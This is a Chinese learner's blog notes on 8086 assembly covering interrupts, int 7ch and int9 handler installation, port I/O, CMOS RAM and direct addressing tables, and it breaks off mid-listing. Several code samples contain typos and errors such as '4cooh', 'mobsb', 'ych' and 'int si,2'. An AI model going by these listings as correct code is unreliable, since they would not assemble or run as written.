<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">datasg segment</span><br><span class="line">  db &quot;Beginner&#x27;s All-purpose Symbolic Instruction Code.&quot;,0</span><br><span class="line">data ends</span><br><span class="line">codesg segment</span><br><span class="line">begin:mov ax,datasg</span><br><span class="line">      mov ds,ax</span><br><span class="line">      mov si,0</span><br><span class="line">      call letterc</span><br><span class="line"></span><br><span class="line">      mov ax,4cooh</span><br><span class="line">      int 21h</span><br><span class="line"></span><br><span class="line">letterc:</span><br><span class="line">s0   :mov cl,[si]</span><br><span class="line">      mov ch,0</span><br><span class="line">      jcxz then</span><br><span class="line">      cmp cl,97</span><br><span class="line">      jb over;如果小于97，进行下一个字符</span><br><span class="line">      cmp cl,122;如果大于122，进行下一个</span><br><span class="line">      ja over</span><br><span class="line">      and cl,11011111b;如果在区间内则</span><br><span class="line">      mov [si],cl</span><br><span class="line">over :inc si</span><br><span class="line">      jmp s0</span><br><span class="line">then :ret</span><br><span class="line">codesg ends</span><br><span class="line">end begin</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406203439.png"></p>
<p>运行完我们使用d命令进行检测，全部都是大写，成功。</p>
<h1 id="第十二章-内中断"><a href="#第十二章-内中断" class="headerlink" title="第十二章  内中断"></a>第十二章  内中断</h1><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406212630.png"></p>
<h2 id="内中断的产生"><a href="#内中断的产生" class="headerlink" title="内中断的产生"></a>内中断的产生</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406213552.png"></p>
<p>有四种中断源，前三个看不懂，但是最后这个int很熟悉，我们可以推测一下，int 21，21这个中断类型码代表的就是结束程序。CPU通过中断类型码来识别中断信息的来源。</p>
<h2 id="中断过程"><a href="#中断过程" class="headerlink" title="中断过程"></a>中断过程</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407135334.png"></p>
<p>1.取得中断类型码</p>
<p>2.标志寄存器入栈</p>
<p>3.设置标志寄存器</p>
<p>4.CS的内容入栈</p>
<p>5.IP的内容入栈</p>
<p>6.读取入口地址</p>
<h2 id="中断处理程序和iret指令"><a href="#中断处理程序和iret指令" class="headerlink" title="中断处理程序和iret指令"></a>中断处理程序和iret指令</h2><p>中断处理程序是存储在内存某段空间之中的，因为CPU随时都可能执行中断处理程序。中断处理程序的入口地址，即中断向量，必须存储在对应的中断向量表中。<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407140044.png"></p>
<p>iret指令相较于ret指令多了一步，让标志寄存器出栈</p>
<p>pop IP</p>
<p>pop CS</p>
<p>popf</p>
<h2 id="向量表"><a href="#向量表" class="headerlink" title="向量表"></a>向量表</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407181125.png"></p>
<h2 id="实验-12-编写0号中断的处理程序"><a href="#实验-12-编写0号中断的处理程序" class="headerlink" title="实验 12 编写0号中断的处理程序"></a>实验 12 编写0号中断的处理程序</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407140951.png"></p>
<p>要点：1.中断处理程序一般存储在0000：0200~0000：02ff这256个字节中。</p>
<p>​            2.显示缓冲区 以B8000开始 25x80，25行80列，一列160个字节，两个字节显示一个字</p>
<p>​            3.我们想要现实的字符串，不能刚开始就存放在data段中，因为这个程序执行完之后，它所占用的内存空间被系统释放，在其中存放的字符串很可能会被别的信息覆盖，所以我们将字符串放置在do0程序中</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">d<span class="meta">o0</span>安装程序  将d<span class="meta">o0</span>的内容放在以<span class="number">0000</span>：<span class="number">0200</span>开头的那段空间中</span><br><span class="line">设置中断向量表 将中断类型码<span class="number">0</span>对应的中断向量表改为d<span class="meta">o0</span>程序的起始地址 注意第一个字节是偏移地址，第二个字节是段地址</span><br><span class="line">d<span class="meta">o0</span>程序 实现功能</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:;do0安装程序</span><br><span class="line">      mov ax,cs    </span><br><span class="line">      mov ds,ax    ;设置ds：si指向源地址（do0）</span><br><span class="line">      mov si,offset do0;刚开始忘了设置si了，导致源地址指向了向量表</span><br><span class="line">      mov ax,0</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov di,200h  ;设置es：di指向目的地址</span><br><span class="line">      </span><br><span class="line">      mov cx,offset do0end-do0</span><br><span class="line">      cld          ;设置传输方向为正</span><br><span class="line">      rep movsb    ;逐字节传输</span><br><span class="line">      </span><br><span class="line">      ;设置中断向量表</span><br><span class="line">      mov ax,0</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov word ptr es:[0],200h;通用的格式是[n*4]</span><br><span class="line">      mov word ptr es:[2],0</span><br><span class="line">      ;检测程序</span><br><span class="line">      mov ax,1000h</span><br><span class="line">      mov bh,1</span><br><span class="line">      div bh</span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">  do0:jmp short do0start</span><br><span class="line">      db &quot;divide erro!&quot;</span><br><span class="line">do0start:</span><br><span class="line">      mov ax,cx</span><br><span class="line">      mov ds,ax</span><br><span class="line">      mov si,202h      ;设置es:di指向字符串，刚开始的jmp指令长度为两个字节</span><br><span class="line">      mov ax,0b800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov di,12*160+36*2 ;第十三行，第36列</span><br><span class="line">      mov cx,12       ;cx为字符串长度</span><br><span class="line">   s: mov al,[si]</span><br><span class="line">      mov es:[di],al</span><br><span class="line">      mov es:[di+1],7ch</span><br><span class="line">      inc si</span><br><span class="line">      add di,2</span><br><span class="line">      loop s</span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">do0end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line">      </span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<h1 id="第十三章-int-指令"><a href="#第十三章-int-指令" class="headerlink" title="第十三章 int 指令"></a>第十三章 int 指令</h1><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407162603.png"></p>
<h2 id="BIOS和DOS所提供的中断例程"><a href="#BIOS和DOS所提供的中断例程" class="headerlink" title="BIOS和DOS所提供的中断例程"></a>BIOS和DOS所提供的中断例程</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407170452.png"></p>
<h2 id="实验-13-编写、应用中断例程"><a href="#实验-13-编写、应用中断例程" class="headerlink" title="实验 13 编写、应用中断例程"></a>实验 13 编写、应用中断例程</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407172949.png"></p>
<p>这一题应该可以调用int 10的9号子程序吧，搭配2号子程序设置光标，但是9号子程序的结束标志是‘$’，看来是想让我们自己实现。</p>
<p>在网上看到了一种方法，先把安装程序执行，在运行测试程序，只要不重启DOSBox，就会保存我们设置的中断例程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;编写安装程序</span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,cs</span><br><span class="line">      mov ds,ax</span><br><span class="line">      mov si,offset ins             ;设置ds:si指向源程序</span><br><span class="line">      mov ax,0</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov di,200h                   ;设置es:di指向目的地址</span><br><span class="line">      mov cx，offset insends-0ffset ins      ;传输长度</span><br><span class="line">      cld                            ;正向传输</span><br><span class="line">      rep mobsb</span><br><span class="line">      ;设置中断向量表</span><br><span class="line">      mov ax,0</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov word ptr es:[7ch*4],200h     ;两个字节存一个地址 高地址存段 低地址存偏移</span><br><span class="line">      mov word ptr es:[ych*4+2],0</span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">  ins:sub dh,1;这里注意000是第一行开始，160是第2行开始</span><br><span class="line">      mov al,160</span><br><span class="line">      mul dh;存入的数据是7*160，即第八行开始</span><br><span class="line">      mov bx,ax</span><br><span class="line">      mov dh,0</span><br><span class="line">      add bx,dx</span><br><span class="line">      add bx,dx;这里实现列数，注意两个字节表一个字符，所以我们加两次即加6</span><br><span class="line">      mov ax,0b800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov al,cl</span><br><span class="line">    s:mov cl,[si]</span><br><span class="line">      mov ch,0</span><br><span class="line">      jcxz ok;如果是结束字符0，则跳转回去</span><br><span class="line">      mov es:[bx],cl</span><br><span class="line">      mov es:[bx+1],al</span><br><span class="line">      inc si</span><br><span class="line">      add bx,2</span><br><span class="line">      jmp short s</span><br><span class="line">ok:   iret</span><br><span class="line">insends:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>这里的ins程序和我们之前做的show_str十分吻合，我们直接copy过来，不要忘记将子程序使用的寄存器入栈然后反序出栈。</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407185352.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407185417.png"></p>
<p>啊这个不就是书中的例子吗，自己尝试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;编写安装程序 照着抄即可</span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,cs</span><br><span class="line">      mov ds,ax</span><br><span class="line">      mov si,offset ins             ;设置ds:si指向源程序</span><br><span class="line">      mov ax,0</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov di,200h                   ;设置es:di指向目的地址</span><br><span class="line">      mov cx,offset insends-offset ins      ;传输长度</span><br><span class="line">      cld                            ;正向传输</span><br><span class="line">      rep movsb</span><br><span class="line">      ;设置中断向量表</span><br><span class="line">      mov ax,0</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov word ptr es:[7ch*4],200h     ;两个字节存一个地址 高地址存段 低地址存偏移</span><br><span class="line">      mov word ptr es:[7ch*4+2],0</span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">  ins:push bp</span><br><span class="line">      mov bp,sp</span><br><span class="line">      dec cx</span><br><span class="line">      jcxz lpret</span><br><span class="line">      add [bp+2],bx    ;给原来的ip加上位移 </span><br><span class="line">lpret:pop bp</span><br><span class="line">      iret</span><br><span class="line">insends:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>本来ins那里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ins：</span><br><span class="line">      dec cx</span><br><span class="line">      jcxz lpret</span><br><span class="line">      add [sp],bx    ;给原来的ip加上位移 </span><br></pre></td></tr></table></figure>

<p>然后就出现了一个报错：must be index or base register 必须是索引寄存器或者base寄存器</p>
<p>也就是sp不能放在[]里单独使用，只有bx、si、di、bp （第八章）</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407193620.png"></p>
<p>看到后面的’$‘,不难看出下面将使用int 21的子程序</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407194103.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230407193938.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">	s1:	db &#x27;Good,better,best,&#x27;,&#x27;$&#x27;</span><br><span class="line">	s2: db &#x27;Never let it rest&#x27;,&#x27;$&#x27;</span><br><span class="line">	s3: db &#x27;Till good is better&#x27;,&#x27;$&#x27;</span><br><span class="line">	s4: db &#x27;And better,best.&#x27;,&#x27;$&#x27;</span><br><span class="line">	s : dw offset s1,offset s2,offset s3,offset s4</span><br><span class="line">	row: db 2,4,6,8</span><br><span class="line"></span><br><span class="line">strat:</span><br><span class="line">	mov ax,cs</span><br><span class="line">	mov ds,ax</span><br><span class="line">	mov bx,offset s</span><br><span class="line">	mov si,offset row</span><br><span class="line">	mov cx,4</span><br><span class="line">ok:</span><br><span class="line">	mov bh,0</span><br><span class="line">	mov dh,ds:[si]</span><br><span class="line">	mov dl,0</span><br><span class="line">	mov ah,2</span><br><span class="line">	int 10h</span><br><span class="line"></span><br><span class="line">	mov dx,ds:[bx]</span><br><span class="line">	mov ah,9</span><br><span class="line">	int 21h</span><br><span class="line"></span><br><span class="line">	add bx,2</span><br><span class="line">	int si,2</span><br><span class="line">	loop ok</span><br><span class="line"></span><br><span class="line">	mov ax,4c00h</span><br><span class="line">	int 21h</span><br><span class="line">code ends</span><br><span class="line">end strat		</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="第十四章-端口"><a href="#第十四章-端口" class="headerlink" title="第十四章 端口"></a>第十四章 端口</h1><h2 id="端口的读写"><a href="#端口的读写" class="headerlink" title="端口的读写"></a>端口的读写</h2><p>端口的读写指令只有两条，in和out，分别用于从端口读取数据和往端口写入数据</p>
<p>举个例子 （这里的in和out是针对 out就是从寄存器中出去）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dx,3f8h ;将端口号送入dx</span><br><span class="line">in  al,dx   ;从3f8h端口读入一个字节，就是将dx中的数据送入al</span><br><span class="line">out dx,al   ;向3f8h端口写入一个字节，将al中的数据写入dx</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230409205632.png"></p>
<h2 id="CMOS-RAM-芯片"><a href="#CMOS-RAM-芯片" class="headerlink" title="CMOS RAM 芯片"></a>CMOS RAM 芯片</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230409205749.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230409205813.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,2</span><br><span class="line">out 70h,al</span><br><span class="line">in al,71h</span><br></pre></td></tr></table></figure>

<h2 id="逻辑位移指令-shl和shr"><a href="#逻辑位移指令-shl和shr" class="headerlink" title="逻辑位移指令 shl和shr"></a>逻辑位移指令 shl和shr</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230409210214.png"></p>
<p>左移相当于x*2，右移相当于x&#x2F;2。</p>
<h2 id="实验-14-访问-CMOS-RAM"><a href="#实验-14-访问-CMOS-RAM" class="headerlink" title="实验 14 访问 CMOS RAM"></a>实验 14 访问 CMOS RAM</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230409210618.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230409210754.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">      mov cx,3</span><br><span class="line">      mov si,30</span><br><span class="line">   s: push cx</span><br><span class="line">      add cx,6</span><br><span class="line">      mov al,cl</span><br><span class="line">      out 70h,al</span><br><span class="line">      in al,71h</span><br><span class="line">      mov ah,al</span><br><span class="line">      mov cl,4</span><br><span class="line">      shr ah,cl</span><br><span class="line">      and al,00001111b</span><br><span class="line">      add ah,30h    ;以ascii表示</span><br><span class="line">      add al,30h</span><br><span class="line">      mov bx,0b800h</span><br><span class="line">      mov es,bx</span><br><span class="line">      mov bx,si</span><br><span class="line">      mov byte ptr es:[160*12+si+bx],ah</span><br><span class="line">      mov byte ptr es:[160*12+si+bx+2],al</span><br><span class="line">      mov byte ptr es:[160*12+si+bx+4],2fh</span><br><span class="line">      add si,3</span><br><span class="line">      pop cx</span><br><span class="line">      loop s</span><br><span class="line">      mov cx,3</span><br><span class="line">  s2: push cx</span><br><span class="line">      add cx,cx</span><br><span class="line">      sub cx,2</span><br><span class="line">      push cx</span><br><span class="line">      mov al,cl</span><br><span class="line">      out 70h,al</span><br><span class="line">      in al,71h</span><br><span class="line">      mov ah,al</span><br><span class="line">      mov cl,4</span><br><span class="line">      shr ah,cl</span><br><span class="line">      and al,00001111b</span><br><span class="line">      add ah,30h    ;以ascii表示</span><br><span class="line">      add al,30h</span><br><span class="line">      mov bx,0b800h</span><br><span class="line">      mov es,bx</span><br><span class="line">      mov bx,si</span><br><span class="line">      mov byte ptr es:[160*12+si+bx],ah</span><br><span class="line">      mov byte ptr es:[160*12+si+bx+2],al</span><br><span class="line">      pop cx</span><br><span class="line">      jcxz ok    ;如果没有这一步的化，最后秒后面会多出一个冒号</span><br><span class="line">      mov byte ptr es:[160*12+si+bx+4],3ah     ;冒号的ascii</span><br><span class="line">      add si,3</span><br><span class="line">      pop cx</span><br><span class="line">      loop s2 </span><br><span class="line">   ok:mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line">      </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230409231300.png"></p>
<h1 id="第十五章-外中断"><a href="#第十五章-外中断" class="headerlink" title="第十五章 外中断"></a>第十五章 外中断</h1><p>用两个16位寄存器来存放32位的循环次数，这里刚开始没看懂，在网上找到了一个恍然大悟</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   mov ds,10h</span><br><span class="line">   mov ax,0</span><br><span class="line">s: sub ax,1    ;第一次ax=fffffh，cf=1</span><br><span class="line">   sbb dx,0    ;第一次dx=fh</span><br><span class="line">   cmp ax,0</span><br><span class="line">   jne s</span><br><span class="line">   cmp dx,0</span><br><span class="line">   jne s</span><br></pre></td></tr></table></figure>

<p>上述程序实现了循环100000次。sbb dx,0 相当于dx&#x3D;dx-0-CF,每循环（ffffh+1）即10000h次，dx减1.注意这里dx减1，发生在每10000次循环的最开始哦。</p>
<h2 id="sti和cli指令"><a href="#sti和cli指令" class="headerlink" title="sti和cli指令"></a>sti和cli指令</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230410205935.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230410205945.png"></p>
<p>下面的程序用于改变全屏的显示信息非常的炫酷</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">stack segment </span><br><span class="line"> db 128 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack</span><br><span class="line">      mov ss,ax</span><br><span class="line">      mov sp,128</span><br><span class="line">      push cs</span><br><span class="line">      pop ds</span><br><span class="line">      mov ax,0</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov si,offset int9</span><br><span class="line">      mov di,204h</span><br><span class="line">      mov cx,offset int9end-offset int9</span><br><span class="line">      cld</span><br><span class="line">      rep movsb</span><br><span class="line">      push es:[9*4]</span><br><span class="line">      pop es:[200h]</span><br><span class="line">      push es:[9*4+2]</span><br><span class="line">      pop es:[202h]</span><br><span class="line">      cli</span><br><span class="line">      mov word ptr es:[9*4],204h</span><br><span class="line">      mov word ptr es:[9*4+2],0</span><br><span class="line">      sti</span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">int9: push ax</span><br><span class="line">      push bx</span><br><span class="line">      push cx</span><br><span class="line">      push es</span><br><span class="line">      in al,60h               ;接收键入的字符</span><br><span class="line">      pushf</span><br><span class="line">      call dword ptr cs:[200h]</span><br><span class="line">      cmp al,3bh</span><br><span class="line">      jne int9ret</span><br><span class="line">      mov ax,0b800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov bx,1</span><br><span class="line">      mov cx,2000</span><br><span class="line">  s:  inc byte ptr es:[bx]</span><br><span class="line">      add bx,2</span><br><span class="line">      loop s</span><br><span class="line">int9ret:pop es</span><br><span class="line">        pop cx</span><br><span class="line">        pop bx</span><br><span class="line">        pop ax</span><br><span class="line">        iret</span><br><span class="line">int9end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="实验-15-安装新的int9中断例程"><a href="#实验-15-安装新的int9中断例程" class="headerlink" title="实验 15 安装新的int9中断例程"></a>实验 15 安装新的int9中断例程</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230410220732.png"></p>
<p>这次实验我们只需要更改上面程序int9的部分即可，A的通码1E，断码9E</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">stack segment </span><br><span class="line"> db 128 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack</span><br><span class="line">      mov ss,ax</span><br><span class="line">      mov sp,128</span><br><span class="line">      push cs</span><br><span class="line">      pop ds</span><br><span class="line">      mov ax,0</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov si,offset int9</span><br><span class="line">      mov di,204h</span><br><span class="line">      mov cx,offset int9end-offset int9</span><br><span class="line">      cld</span><br><span class="line">      rep movsb</span><br><span class="line">      push es:[9*4]</span><br><span class="line">      pop es:[200h]</span><br><span class="line">      push es:[9*4+2]</span><br><span class="line">      pop es:[202h]</span><br><span class="line">      cli</span><br><span class="line">      mov word ptr es:[9*4],204h</span><br><span class="line">      mov word ptr es:[9*4+2],0</span><br><span class="line">      sti</span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">int9: push ax</span><br><span class="line">      push bx</span><br><span class="line">      push cx</span><br><span class="line">      push es</span><br><span class="line">      in al,60h               ;接收键入的字符</span><br><span class="line">      pushf</span><br><span class="line">      call dword ptr cs:[200h]</span><br><span class="line">      cmp al,1eh               ;A的通码</span><br><span class="line">      je int9ret</span><br><span class="line">      cmp al,9eh</span><br><span class="line">      jne int9ret</span><br><span class="line">      mov ax,0b800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov bx,0</span><br><span class="line">      mov cx,2000</span><br><span class="line">  s:  mov byte ptr es:[bx],65</span><br><span class="line">      add bx,2</span><br><span class="line">      loop s</span><br><span class="line">int9ret:pop es</span><br><span class="line">        pop cx</span><br><span class="line">        pop bx</span><br><span class="line">        pop ax</span><br><span class="line">        iret</span><br><span class="line">int9end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="第十六章-直接定址表"><a href="#第十六章-直接定址表" class="headerlink" title="第十六章 直接定址表"></a>第十六章 直接定址表</h1><h2 id="描述了单元长度的标号"><a href="#描述了单元长度的标号" class="headerlink" title="描述了单元长度的标号"></a>描述了单元长度的标号</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230411145516.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code segment</span><br><span class="line">    a db 1,2,3,4,5,6,7,8</span><br><span class="line">    b dw 0</span><br><span class="line">    ;这里的a其实可以理解为数组的首地址a[0]是1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230411145837.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:db 1,2,3,4</span><br><span class="line">b:dw 0</span><br><span class="line">;这种用法是代码段中特有的    即使用  :</span><br></pre></td></tr></table></figure>

<h2 id="将标号当作数据来使用"><a href="#将标号当作数据来使用" class="headerlink" title="将标号当作数据来使用"></a>将标号当作数据来使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data segment</span><br><span class="line"> a db 1,2,3,4,5</span><br><span class="line"> b dw 0</span><br><span class="line"> c dw a,b      ;c dd a,b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data segment</span><br><span class="line"> a db 1,2,3,4,5</span><br><span class="line"> b dw 0</span><br><span class="line"> c dw offset a,offset b   ;c dw offset a,seg a,offset b,seg b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure>

<p>seg 取段地址</p>
<h2 id="实验-16"><a href="#实验-16" class="headerlink" title="实验 16"></a>实验 16</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230411122855.png"></p>
<p>具体的功能怎么实现，书中写的很清楚，我们的任务是确定整个程序的框架。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">stack segment </span><br><span class="line">   db 64 dup(0)</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">start:;安装新的int7ch</span><br><span class="line">mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,64</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,offset int7ch</span><br><span class="line">mov si,ax</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200h</span><br><span class="line">mov cx,offset int7chend-offset int7ch</span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br><span class="line">cli</span><br><span class="line">mov word ptr es:[7ch*4],200h</span><br><span class="line">mov word ptr es:[7ch*4+2],0</span><br><span class="line">sti</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">int7ch:</span><br><span class="line">     jmp short set</span><br><span class="line">     table dw offset sub1-offset int7ch+200h</span><br><span class="line">           dw offset sub2-offset int7ch+200h</span><br><span class="line">           dw offset sub3-offset int7ch+200h</span><br><span class="line">           dw offset sub4-offset int7ch+200h</span><br><span class="line"> set:push bx</span><br><span class="line">     cmp ah,3</span><br><span class="line">     ja sret</span><br><span class="line">     mov bl,ah</span><br><span class="line">     mov bh,0</span><br><span class="line">     add bx,bx</span><br><span class="line">     call word ptr cs:[bx+202h] ;这里的cs是跳转到int7ch之后的cs，加202是因为前面的jmp short set占了两个字节</span><br><span class="line">sret:pop bx</span><br><span class="line">     iret</span><br><span class="line">     sub1:push bx             ;清屏</span><br><span class="line">          push cx</span><br><span class="line">          push es</span><br><span class="line">          mov bx,0b800h</span><br><span class="line">          mov es,bx</span><br><span class="line">          mov bx,0</span><br><span class="line">          mov cx,2000</span><br><span class="line">    sub1s:mov byte ptr es:[bx],&#x27; &#x27;</span><br><span class="line">          add bx,2</span><br><span class="line">          loop sub1s</span><br><span class="line">          pop es</span><br><span class="line">          pop cx</span><br><span class="line">          pop bx</span><br><span class="line">          ret</span><br><span class="line">     sub2:push bx             ;前景</span><br><span class="line">          push cx</span><br><span class="line">          push es</span><br><span class="line">          mov bx,0b800h</span><br><span class="line">          mov es,bx</span><br><span class="line">          mov bx,1</span><br><span class="line">          mov cx,2000</span><br><span class="line">    sub2s:and byte ptr es:[bx],11110000b</span><br><span class="line">          or es:[bx],al</span><br><span class="line">          add bx,2</span><br><span class="line">          loop sub2s</span><br><span class="line">          pop es</span><br><span class="line">          pop cx</span><br><span class="line">          pop bx</span><br><span class="line">          ret</span><br><span class="line">     sub3:push bx             ;背景</span><br><span class="line">          push cx</span><br><span class="line">          push es</span><br><span class="line">          mov cl,4</span><br><span class="line">          shl al,cl</span><br><span class="line">          mov bx,0b800h</span><br><span class="line">          mov es,bx</span><br><span class="line">          mov bx,1</span><br><span class="line">          mov cx,2000</span><br><span class="line">    sub3s:and byte ptr es:[bx],10001111b</span><br><span class="line">          or es:[bx],al</span><br><span class="line">          add bx,2</span><br><span class="line">          loop sub3s</span><br><span class="line">          pop es</span><br><span class="line">          pop cx</span><br><span class="line">          pop bx</span><br><span class="line">          ret</span><br><span class="line">     sub4:push cx             ;滚动</span><br><span class="line">          push si</span><br><span class="line">          push di</span><br><span class="line">          push es</span><br><span class="line">          push ds</span><br><span class="line">          mov si,0b800h</span><br><span class="line">          mov es,si</span><br><span class="line">          mov ds,si</span><br><span class="line">          mov si,160</span><br><span class="line">          mov di,0</span><br><span class="line">          cld</span><br><span class="line">          mov cx,24</span><br><span class="line">    